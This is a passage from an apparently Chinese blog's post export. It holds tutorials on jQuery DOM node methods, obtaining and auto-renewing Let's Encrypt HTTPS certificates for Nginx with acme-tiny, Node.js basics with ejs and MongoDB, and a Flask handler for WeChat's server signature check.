添加节点内部插入append(content|fn)appendTo(content)将元素添加到指定元素内部的最后prepend(content|fn)prependTo(content)将元素添加到指定元素内部的最前面外部插入after(content|fn)insertAfter(content)将元素添加到指定元素外部的后面before(content|fn)insertBefore(content)将元素添加到指定元素外部的前面1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;52-jQuery添加节点相关方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* 内部插入 append(content|fn) ：会将元素添加到指定元素内部的最后 appendTo(content) ：会将元素添加到指定元素内部的最后 prepend(content|fn)：会将元素添加到指定元素内部的最前面 prependTo(content) ：会将元素添加到指定元素内部的最前面 外部插入 after(content|fn) ：会将元素添加到指定元素外部的后面 before(content|fn) ：会将元素添加到指定元素外部的前面 insertAfter(content) ：会将元素添加到指定元素外部的后面 insertBefore(content) ：会将元素添加到指定元素外部的前面 * * */ $('button').click(function () &#123; // 1.创建一个节点 var $li = $('&lt;li&gt;新增的li&lt;/li&gt;'); // 2.添加节点 // $('ul').append($li); // $('ul').prepend($li); // 注意点：作用一样但是写法不一样 // $li.appendTo('ul'); // $li.prependTo('ul'); // $('ul').after($li); // $('ul').before($li); // $li.insertAfter('ul'); $li.insertBefore('ul'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;添加节点&lt;/button&gt;&lt;ul&gt; &lt;li&gt;我是第1个li&lt;/li&gt; &lt;li&gt;我是第2个li&lt;/li&gt; &lt;li&gt;我是第3个li&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;2. 删除节点empty()删除指定元素的内容和子元素, 指定元素自身不会被删除remove([expr])删除指定元素detach([expr])remove和detach区别remove删除元素后,元素上的事件会被移出detach删除元素后,元素上的事件会被保留12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;53-jQuery删除节点相关方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* 删除 remove([expr]) : 删除指定元素 empty() : 删除指定元素的内容和子元素，指定元素自身不会被删除 detach([expr]) ：等用于remove([expr]) * */ $('button').click(function () &#123; // $('div').remove(); $('div').empty(); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;删除节点&lt;/button&gt;&lt;ul&gt; &lt;li class="item"&gt;我是第1个li&lt;/li&gt; &lt;li&gt;我是第2个li&lt;/li&gt; &lt;li class="item"&gt;我是第3个li&lt;/li&gt; &lt;li&gt;我是第4个li&lt;/li&gt; &lt;li class="item"&gt;我是第5个li&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;我是div &lt;p&gt;我是一个段落&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3. 替换节点replaceWith(content|fn)将所有匹配的元素替换成指定的HTML或DOM元素replaceWith参数可以是一个DOM元素replaceWith参数也可以是一个代码片段replaceAll(selector)用匹配的元素替换掉所有 selector匹配到的元素12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;54-jQuery替换节点相关方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* 替换 replaceWith(content|fn) replaceAll(selector) 作用:替换所有匹配的元素为指定的元素 */ $('button').click(function () &#123; // 1.新建一个元素 var $h6 = $('&lt;h6&gt;我是标题6&lt;/h6&gt;'); // 2.替换元素 // $('h1').replaceWith($h6); $h6.replaceAll('h1'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;替换节点&lt;/button&gt;&lt;h1&gt;我是标题1&lt;/h1&gt;&lt;h1&gt;我是标题1&lt;/h1&gt;&lt;p&gt;我是段落&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;4. 复制节点[clone(Even[,deepEven]])复制一个节点浅复制不会复制节点的事件深复制会复制节点的事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;55-jQuery复制节点相关方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 复制 // clone([Even[,deepEven]]) // 如果传入false就是浅复制，如果传入true就是深复制 // 浅复制只会复制元素，不会复制元素的事件 // 深复制会复制元素，而且还会复制元素的事件 $('button').eq(0).click(function () &#123; // 1.浅复制一个元素 var $li = $('li:first').clone(false); // 2.将复制的元素添加到ul中 $('ul').append($li); &#125;); $('button').eq(1).click(function () &#123; // 1.深复制一个元素 var $li = $('li:first').clone(true); // 2.将复制的元素添加到ul中 $('ul').append($li); &#125;); $('li').click(function () &#123; alert('li'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;浅复制节点&lt;/button&gt;&lt;button&gt;深复制节点&lt;/button&gt;&lt;ul&gt; &lt;li&gt;我是第1个li&lt;/li&gt; &lt;li&gt;我是第2个li&lt;/li&gt; &lt;li&gt;我是第3个li&lt;/li&gt; &lt;li&gt;我是第4个li&lt;/li&gt; &lt;li&gt;我是第5个li&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;5. 包裹节点都讲了这么多了, 骚年动动手, 查阅下文档, 尝试下自学这几个方法编程不是死记硬背, 是学会找到解决问题的思路和自学新知识的方法6. 节点操作练习]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为网站添加HTTPS支持]]></title>
    <url>%2F2019%2F07%2F03%2F%E4%B8%BA%E7%BD%91%E7%AB%99%E6%B7%BB%E5%8A%A0HTTPS%E6%94%AF%E6%8C%81%2F</url>
    <content type="text"><![CDATA[注：此片帖子参考如下其他帖子，结合自身实际整理而成。参考帖子地址：（1）为网站添加https支持 https://fanzheng.org/archives/21（2）Let’s Encrypt，免费好用的 HTTPS 证书 https://imququ.com/post/letsencrypt-certificate.html（3）本博客 Nginx 配置之完整篇 https://imququ.com/post/my-nginx-conf.html创建帐号首先创建一个目录，例如：/home/microblog/ssl/，用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个 RSA 私钥用于 Let’s Encrypt 识别你的身份：1openssl genrsa 4096 &gt; account.key创建 CSR 文件接着就可以生成 CSR（Certificate Signing Request，证书签名请求）文件了。在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥），根据证书不同类型，域名私钥也可以选择 RSA 和 ECC 两种不同类型。我这采用的是RSA类型创建 RSA 私钥（兼容性好）：1openssl genrsa 4096 &gt; domain.key有了私钥文件，就可以生成 CSR 文件了。在 CSR 中推荐至少把域名带 www 和不带 www 的两种情况都加进去，其它子域可以根据需要添加（目前一张证书最多可以包含 100 个域名）：示例：openssl req -new -sha256 -key domain.key -subj “/“ -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf “[SAN]\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com&quot;)) &gt; domain.csr执行这一步时，如果提示找不到 /etc/ssl/openssl.cnf 文件，请看看 /usr/local/openssl/ssl/openssl.cnf 是否存在。如果还是不行，也可以使用交互方式创建 CSR（需要注意 Common Name 必须为你的域名）：1openssl req -new -sha256 -key domain.key -out domain.csr实际操作：openssl req -new -sha256 -key domain.key -subj “/“ -reqexts SAN -config &lt;(cat /usr/local/ssl/openssl.cnf &lt;(printf “[SAN]\nsubjectAltName=DNS:blog.lehuoha.com”)) &gt; domain.csr注意我的openssl.cnf路径为：/usr/local/ssl/openssl.cnf，域名是：blog.lehuoha.com配置验证服务我们知道，CA 在签发 DV（Domain Validation）证书时，需要验证域名所有权。传统 CA 的验证方式一般是往 `admin@yoursite.com发验证邮件，而 Let&#39;s Encrypt 是在你的服务器上生成一个随机验证文件，再通过创建 CSR 时指定的域名访问，如果可以访问则表明你对这个域名有控制权。具体来说，他会访问网站的/.well-known/acme-challenge/`目录来查看有没有他要求的文件。在这里，我们只需在网站根目录下创建该文件夹即可。首先创建用于存放验证文件的目录，例如：1mkdir -p /home/microblog/.well-known/acme-challenge然后配置一个 HTTP 服务，以 Nginx 为例：(示例)：实际情况需要修改域名，alias别名路径，以及location /{ } 信息等，若有location /{ }的配置参数的话则只需要添加 rewrite ^/(.*)$ https://yoursite.com/$1 permanent;即可123456789101112 server &#123; server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ &#123; alias /home/xxx/www/challenges/; try_files $uri =404; &#125; location / &#123; rewrite ^/(.*)$ https://yoursite.com/$1 permanent; &#125;&#125;以上配置优先查找 ~/www/challenges/ 目录下的文件，如果找不到就重定向到 HTTPS 地址。这个验证服务以后更新证书还要用到，建议一直保留。实际配置：12345678910111213141516171819server &#123; listen 80; server_name blog.lehuoha.com; location ^~ /.well-known/acme-challenge/ &#123; alias /home/microblog/challenges/; try_files $uri =404; &#125; location / &#123; proxy_pass http://127.0.0.1:4010; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; rewrite ^/(.*)$ https://blog.lehuoha.com/$1 permanent; &#125;&#125;获取网站证书先把 acme-tiny 脚本保存到之前的 ssl 目录：1wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py指定账户私钥、CSR 以及验证目录，执行脚本：1python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /home/microblog/challenges &gt; ./signed.crt如果一切正常，当前目录下就会生成一个 signed.crt，这就是申请好的证书文件。搞定网站证书后，还要下载 Let’s Encrypt 的中间证书。我在之前的文章中讲过，配置 HTTPS 证书时既不要漏掉中间证书，也不要包含根证书。在 Nginx 配置中，需要把中间证书和网站证书合在一起：12wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pemcat signed.crt intermediate.pem &gt; chained.pem为了后续能顺利启用 OCSP Stapling，我们再把根证书和中间证书合在一起：12wget -O - https://letsencrypt.org/certs/isrgrootx1.pem &gt; root.pemcat intermediate.pem root.pem &gt; full_chained.pem最终，修改 Nginx 中有关证书的配置并 reload 服务即可：(示例)：若之前配置过ssl则只需要更改证书就行，若未配置过，则需要添加相关配置参数12ssl_certificate ~/www/ssl/chained.pem;ssl_certificate_key ~/www/ssl/domain.key;实际操作后的配置信息：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950server &#123; listen 443 ssl ; server_name blog.lehuoha.com; server_tokens off; ssl on; ssl_certificate /home/microblog/ssl/chained.pem; ssl_certificate_key /home/microblog/ssl/domain.key; ssl_session_timeout 1d; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:50m; ssl_trusted_certificate /home/microblog/ssl/full_chained.pem; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; if ($request_method !~ ^(GET|HEAD|POST|OPTIONS)$ ) &#123; return 444; &#125; location / &#123; proxy_pass http://127.0.0.1:4010; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;server &#123; server_name blog.lehuoha.com; server_tokens off; access_log /dev/null; location ^~ /.well-known/acme-challenge/ &#123; alias /home/microblog/challenges/; try_files $uri =404; &#125; location / &#123; rewrite ^/(.*)$ https://blog.lehuoha.com/$1 permanent; &#125; &#125;重启nginx服务即可。然后访问网站进行测试.配置自动更新Let’s Encrypt 签发的证书只有 90 天有效期，推荐使用脚本定期更新。例如我就创建了一个 renew_cert.sh 并通过 chmod a+x renew_cert.sh 赋予执行权限。文件内容如下：1234567#!/bin/bashcd /home/microblog/ssl/python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /home/microblog/challenges &gt; ./signed.crt || exitwget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pemcat signed.crt intermediate.pem &gt; chained.pemservice nginx reloadcrontab 中使用绝对路径比较保险，crontab -e 加入以下内容：10 0 1 * * /home/microblog/ssl/renew_cert.sh &gt;/dev/null 2&gt;&amp;1这样以后证书每个月都会自动更新，一劳永逸。实际上，Let’s Encrypt 官方将证书有效期定为 90 天一方面是为了更安全，更重要的是鼓励用户采用自动化部署方案。]]></content>
      <categories>
        <category>python</category>
        <category>flask</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js入门]]></title>
    <url>%2F2019%2F07%2F03%2FNode-js%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[什么是Node.js？概要Node.js是一个Javascript运行环境(runtime)，发布于2009年5月，由Ryan Dahl开发，实质是对Chrome V8引擎进行了封装。Node.js 的包管理器 npm，是全球最大的开源库生态系统。官方网站https://nodejs.org/使用版本10.16.0 LTS基础知识Javascript/ES2015(ES6)Unix/Linux(Ubuntu)开发工具记事本等文本编辑器Visual Studio Code(推荐)BracketsATOM浏览器Google Chrome(推荐)FireFoxIE/edge线程模型和事件循环知识点线程模型事件循环线程模型Apache+Tomcat(6,7,8,9)运行req来袭thread应对req处理完后，thread释放线程处理模式就是重复以上三个步骤，来处理来自客户端的各种请求，当有大量客户端的请求来袭时，服务器消耗的资源也会随之增加。事件循环Node.js服务运行开一个事件等待循环（event-loop）req来袭放入事件处理队列中，然后继续等待新的req请求req处理完成后，调用I/O，结束req(非阻塞调用)事件循环处理模式中，线程不用等待req处理完后在进行下个req的处理，而是将所有的req请求放入到队列之中，然后采用非同步的方式，等待req处理完后再调用I/O资源，然后结束req。从HelloWorld开始知识点Node.js控制台javascript文件实战演习Node.js控制台12345678910111213141516171819202122232425C:\Users\sanduλ npm --version # 查看npm版本6.9.0C:\Users\sanduλ node --version # 查看node.js版本v10.16.0C:\Users\sandu λ node # Node.js控制台入口&gt; console.log('hello world!'); # 输出loghello world!undefined&gt; .help # 查看命令帮助.break Sometimes you get stuck, this gets you out.clear Alias for .break.editor Enter editor mode.exit Exit the repl.help Print this help message.load Load JS from a file into the REPL session.save Save all evaluated commands in this REPL session to a file&gt; .exit # 退出命令控制台javascript文件创建一个heloworld.js文件，内容如下：1234console.log(&apos;hello world!&apos;);var str = &apos;hello&apos;;console.log(str);使用node.js执行该js文件：1234D:\node_testλ node helloworld.jshello world!hello非阻塞处理知识点阻塞处理(Java,Ruby,PHP,Asp.Net)非阻塞处理(Node.js)实战演习12345678910111213141516171819202122232425////////////////////// 阻塞处理////////////////////function updb1() &#123; var start = new Date().getTime(); while (new Date().getTime() &lt; start + 3000);&#125;updb1();//数据库更新完毕后才会执行下面这俩console.log("updb1 success.");console.log("I like javascript.");////////////////////// 非阻塞处理////////////////////function updb2(done) &#123; setTimeout(() =&gt; &#123; done(); &#125;, 3000);&#125;updb2(function () &#123; //数据库更新完毕后再执行这个回调函数 console.log("updb2 success.");&#125;);console.log("I like Nodejs."); // 先执行这个简单的Web服务器知识点http内置模块参照文档：https://nodejs.org/en/about/实战演习123456789101112131415const http = require('http');const hostname = '127.0.0.1';const port = 3000;const server = http.createServer((req,res) =&gt; &#123; res.statusCode = 200; res.setHeader('Content-Type', 'text/plain'); res.end('Hello world\n');&#125;);server.listen(port,hostname,() =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`); &#125;);// 使用浏览器访问http://127.0.0.1:3000,页面上就会出现Hello world引用外部js文件知识点require：引用外部js文件实战演习config.js12345const config = &#123; hostname:'127.0.0.1', port:3000,&#125;;exports.config = config;myserver.js123456789101112const http = require('http');const config = require('./config.js').config;const server = http.createServer((req,res) =&gt; &#123; res.statusCode = 200; res.setHeader('Content-Type', 'text/plain'); res.end('Hello world\n');&#125;);server.listen(config.port,config.hostname,() =&gt; &#123; console.log(`Server running at http://$&#123;config.hostname&#125;:$&#123;config.port&#125;/`); &#125;);URL为我指引方向知识点req.url：返回客户端请求的url地址实战演习123456789101112131415161718192021222324252627const http = require('http');const hostname = '127.0.0.1';const port = 3000;const server = http.createServer((req, res) =&gt; &#123; res.statusCode = 200; res.setHeader('Content-Type', 'text/plain'); switch (req.url) &#123; case '/': res.end('helo world.'); break; case '/about': res.end('This is about page.'); break; case '/home': res.end('Welcome to my homepage!'); break; default: res.end('NotFound!'); &#125;&#125;);server.listen(port, hostname, () =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);&#125;);你写我读HTML知识点fs文件读写模块的引用实战演习index.html12345&lt;html&gt; &lt;body&gt; &lt;h1&gt;Helo index.html!&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;myserver.js12345678910111213141516171819202122232425const http = require('http');const hostname = '127.0.0.1';const port = 3000;const fs = require('fs');const server = http.createServer((req,res) =&gt; &#123; fs.readFile(__dirname + '/index.html','utf-8',function(err,data) &#123; if (err) &#123; res.setHeader('Content-Type', 'text/plain'); res.statusCode = 400; res.end('Not Found!\n'); &#125; else &#123; res.setHeader('Content-Type', 'text/html'); res.statusCode = 200; res.end(data); // 浏览器界面会出现index.html文件中的内容，也就是Hello world! &#125; &#125;);&#125;);server.listen(port,hostname,() =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`); &#125;);// 修改index.html文件中的内容后，刷新浏览器会自动更新显示出来npm包管理器知识点npm的使用方法ejs的安装npm是Node.js附带的第三方软件包管理器，可以为Node.js提供更多的功能支持。npm官网https://npmjs.org/ejs(Effective JavaScript templating)http://ejs.co/实战演习123456D:\node_test// 需要package.json才能npm install。// 可以npm init初始化生成一个package.json。// 然后就可以愉快地npm install了。λ npm initλ npm install ejshello.ejs123456&lt;html&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;body&gt; &lt;%- content %&gt; &lt;/body&gt;&lt;/html&gt;ejs能写网页？知识点ejs的使用实战演习hello.ejs123456789&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;%= content %&gt;&lt;/body&gt;&lt;/html&gt;myserver.js1234567891011121314151617181920const http = require('http');const fs = require('fs');const ejs = require('ejs');var template = fs.readFileSync(__dirname + '\\hello.ejs','utf-8'); //注意引用的路径const server = http.createServer((req, res) =&gt; &#123; var data = ejs.render(template, &#123; title: 'helo ejs', content: '&lt;strong&gt;big helo ejs.&lt;/strong&gt;' &#125;); res.setHeader('Content-Type', 'text/html'); res.statusCode = 200; res.end(data);&#125;);const hostname = '127.0.0.1';const port = 3000;server.listen(port, hostname, () =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);&#125;);// 不知因为啥原因，&lt;strong&gt;&lt;/strong&gt;标签没生效，而是在页面上直接显示出来了做个小论坛知识点做一个含有表单的论坛网页实战演习forum.ejs1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang="zh-cmn-Hans"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;小论坛&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="" method="post"&gt; &lt;input type="text" name="content" id="content"&gt; &lt;input type="submit" value="提交"&gt; &lt;ul&gt; &lt;% for(var i = 0; i &lt; posts.length; i++) &#123; %&gt; &lt;li&gt;&lt;%= posts[i] %&gt;&lt;/li&gt; &lt;% &#125; %&gt; &lt;/ul&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;表单的处理知识点服务器表单的处理实战演习myserver.js123456789101112131415161718192021222324252627282930313233343536373839404142434445const http = require('http');const fs = require('fs');const ejs = require('ejs');const qs = require('querystring'); //+var template = fs.readFileSync(__dirname + '/forum.ejs', 'utf-8');var posts = []; //+const server = http.createServer((req, res) =&gt; &#123; if (req.method === 'POST') &#123; //表单提交 req.data = ""; req.on("readable", function () &#123; //表单数据收集 var chr = req.read(); if (chr) req.data += chr; &#125;); req.on("end", function () &#123; //表单处理 var query = qs.parse(req.data); posts.push(query.content); showForm(posts, res); &#125;); &#125; else &#123; //表单显示 showForm(posts, res); &#125;&#125;);const hostname = '127.0.0.1';const port = 3000;server.listen(port, hostname, () =&gt; &#123; console.log(`Server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);&#125;);function showForm(p_posts, res) &#123; var data = ejs.render(template, &#123; title: 'helo ejs', posts: p_posts &#125;); res.setHeader('Content-Type', 'text/html'); res.statusCode = 200; res.end(data);&#125;连接MongoDB知识点mongodb驱动安装node.js连接MongoDB实战演习mongodb驱动安装官方网站：http://mongodb.github.io/node-mongodb-native/1$ npm install mongodb --savePS：Mongoose也是一个非常不错的MongoDB存取API，也推荐给您。node.js操作MongoDBmongofunc.js12345678910111213141516const MongoClient = require('mongodb').MongoClient;const assert = require('assert');// Connection URLconst url = 'mongodb://127.0.0.1:27017'; // 本机需要事先安装并启动MongoDB// Database Nameconst dbName = 'blog';// Use connect method to connect to the serverMongoClient.connect(url, &#123; useNewUrlParser: true &#125;, function (err, client) &#123; assert.equal(null, err); console.log("Connected successfully to server"); const db = client.db(dbName); client.close();&#125;);插入MongoDB文档知识点node.js操作MongoDB实战演习mongofunc.js12345678910111213141516171819202122232425262728const MongoClient = require('mongodb').MongoClient;const assert = require('assert');// Connection URLconst url = 'mongodb://127.0.0.1:27017';// Database Nameconst dbName = 'blog';// Use connect method to connect to the serverMongoClient.connect(url, &#123; useNewUrlParser: true &#125;, function (err, client) &#123; assert.equal(null, err); console.log("Connected successfully to server"); const db = client.db(dbName); db.collection("posts", function (err, collection) &#123; var list = [ &#123;title:"我爱玩马里奥", tag:"game"&#125;, &#123;title:"我喜欢Nodejs编程", tag:"it"&#125;, &#123;title:"我会用MongoDB", tag:"it"&#125; ]; collection.insert(list, function (err, result) &#123; assert.equal(null, err); client.close(); &#125;); &#125;);&#125;);读出MongoDB文档知识点node.js读取MongoDB实战演习mongofunc.js123456789101112131415161718192021222324const MongoClient = require('mongodb').MongoClient;const assert = require('assert');// Connection URLconst url = 'mongodb://127.0.0.1:27017';// Database Nameconst dbName = 'blog';// Use connect method to connect to the serverMongoClient.connect(url, &#123; useNewUrlParser: true &#125;, function (err, client) &#123; assert.equal(null, err); console.log("Connected successfully to server"); const db = client.db(dbName); db.collection("posts", function (err, collection) &#123; collection.find(&#123;tag:"game"&#125;).toArray(function (err, docs) &#123; assert.equal(null, err); console.log(docs); client.close(); &#125;); &#125;);&#125;);Node.js回调地狱知识点Node.js回调地狱Promise承诺解决回调地狱Node.js是非阻塞编程，那么在编码过程中会遇到很多的回调函数（Callback），如果多个处理的回调函数嵌套在一起的话，就会形成回调地狱，虽然对于程序的结果没有任何影响，但对于程序代码的可读性来说就是个地狱。12345678910111213//回调地狱function dbupd(sql, done) &#123; setTimeout(() =&gt; done(sql + " upd ok."), 800);&#125;dbupd("1.sql1", result =&gt; &#123; console.log(result); dbupd("2.sql2", result =&gt; &#123; console.log(result); dbupd("3.sql3", result =&gt; &#123; console.log(result); &#125;); &#125;);&#125;);Promise解决12345678910111213141516171819202122// Promise函数嵌套解决方法function dbupAsync(sql) &#123; const p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(sql + " upd ok."); resolve(sql + ".ok"); &#125;, 800) &#125;); return p;&#125;dbupAsync("2.sql1") .then(() =&gt; dbupAsync("2.sql2")) .then(() =&gt; dbupAsync("3.sql3"));// 代码更加简洁的async/awaitasync function upAllDB() &#123; const result1 = await dbupAsync("3.sql1"); const result2 = await dbupAsync("3.sql2"); const result3 = await dbupAsync("3.sql3"); console.log(result1, result2, result3);&#125;upAllDB();Promise解决回掉地狱知识点Promise承诺解决实际演示一下回掉地狱，以及如何解决回掉地狱12345678910111213// updb1.js演示一下回掉地狱function dbupd(sql, done) &#123; setTimeout(() =&gt; done(sql + " upd ok."), 800);&#125;dbupd("1.sql1", result =&gt; &#123; console.log(result); dbupd("2.sql2", result =&gt; &#123; console.log(result); dbupd("3.sql3", result =&gt; &#123; console.log(result); &#125;); &#125;);&#125;);1234567891011121314151617181920212223// updb2.js解决回掉地狱// Promise函数嵌套解决方法function dbupAsync(sql) &#123; const p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(sql + " upd ok."); resolve(sql + ".ok"); &#125;, 800) &#125;); return p;&#125;// dbupAsync("2.sql1")// .then(() =&gt; dbupAsync("2.sql2"))// .then(() =&gt; dbupAsync("3.sql3"));// 代码更加简洁的async/awaitasync function upAllDB() &#123; const result1 = await dbupAsync("3.sql1"); const result2 = await dbupAsync("3.sql2"); const result3 = await dbupAsync("3.sql3"); console.log(result1, result2, result3);&#125;upAllDB();]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python的flask框架对接微信公众号开发]]></title>
    <url>%2F2019%2F06%2F26%2F%E4%BD%BF%E7%94%A8Python%E7%9A%84flask%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%8E%A5%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[使用说明找一台具有公网IP的服务器安装python3，搭建nginx+uwsgi+flask环境pycharm上配置Deployment，本地代码直接上传到服务器nginx配置文件中设置域名，配置好域名解析我这边的实际配置：域名：wechat_pro.lehuoha.com路径：/home/wechat_pro/app.pyapp.py文件代码(注意文件权限)：12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return 'hello world！'if __name__ == '__main__': app.run(host='0.0.0.0', port=80, debug=True)最终效果是访问http://wechat_pro.lehuoha.com这个域名，能够出现app.py文件中的“hello world！”第三步操作步骤：在pycharm中新建一个项目，比如项目名是：wechat_pro。本地也搭建好环境，安装好依赖，方便使用frpc在本地调试使用在wechat_pro目录下新建app.py文件和uwsgi文件夹，uwsgi文件夹存放相关的uwsgi文件，具体参考&lt;&lt;nginx+uwsgi+flask环境&gt;&gt;在pycharm中，Tools-&gt;Deployment-&gt;Configuration，根据远程链接服务器的方式不同，选择相应的链接方式，比如FTP，Sftp等，我这边采用Sftp，输入连接名，比如：开发测试服务器，在右侧输入公网IP服务器的ip地址，账号，验证方式选择密码，点击“测试链接”。然后设置本地目录跟服务器目录路径的映射，确保本地代码上传到服务器里的指定目录。微信公众号开发对接登录微信公众平台官网后，在公众平台后台管理页面 - 开发者中心页，点击“修改配置”按钮，填写服务器地址（URL）、Token和EncodingAESKey，其中URL是开发者用来接收微信消息和事件的接口URL。Token可由开发者可以任意填写，用作生成签名（该Token会和接口URL中包含的Token进行比对，从而验证安全性）。EncodingAESKey由开发者手动填写或随机生成，将用作消息体加解密密钥。同时，开发者可选择消息加解密方式：明文模式、兼容模式和安全模式。模式的选择与服务器配置在提交后都会立即生效，请开发者谨慎填写及选择。加解密方式的默认状态为明文模式，选择兼容模式和安全模式需要提前配置好相关加解密代码，详情请参考消息体签名及加解密部分的文档。微信公众号接口只支持80接口。由于没有微信公众号，所以使用测试平台。测试平台登陆地址：&lt; http://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login&gt;微信开发者文档网址：https://mp.weixin.qq.com/wiki/home/index.html通过查看开发者文档，可以知道：开发者提交信息后，微信服务器将发送GET请求到填写的服务器地址URL上，GET请求携带四个参数：参数描述signature微信加密签名，signature结合了开发者填写的token参数和请求中的timestamp参数、nonce参数。timestamp时间戳nonce随机数echostr随机字符串开发者通过检验signature对请求进行校验。若确认此次GET请求来自微信服务器，请原样返回echostr参数内容，则接入生效，成为开发者成功，否则接入失败。通俗点来说，就是开发者在接口配置信息填写完URL和自定义的一个Token值之后，腾讯就会发送GET请求到这个服务器的URL地址上，这个GET请求包含如上的四个参数。开发者接收到这四个参数之后，根据一定的规则生成一个signature，跟腾讯发过来的signature进行对比，一致的话则接入生效。这个一定的规则如下：将token、timestamp、nonce三个参数进行字典序排序将三个参数字符串拼接成一个字符串进行sha1加密开发者获得加密后的字符串可与signature对比，标识该请求来源于微信Python代码实现（以Flask框架为例）：123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, request, make_responseimport hashlibapp = Flask(__name__)@app.route('/')def index(): # 设置token,开发者配置中心使用 token = 'wechat_pro' # 获取微信服务器发送过来的参数 data = request.args signature = data.get('signature') timestamp = data.get('timestamp') nonce = data.get('nonce') echostr = data.get('echostr') # 对参数进行字典排序，拼接字符串 temp = [timestamp, nonce, token] temp.sort() temp = ''.join(temp) # 加密 if (hashlib.sha1(temp.encode('utf8')).hexdigest() == signature): return echostr else: return 'error', 403if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, 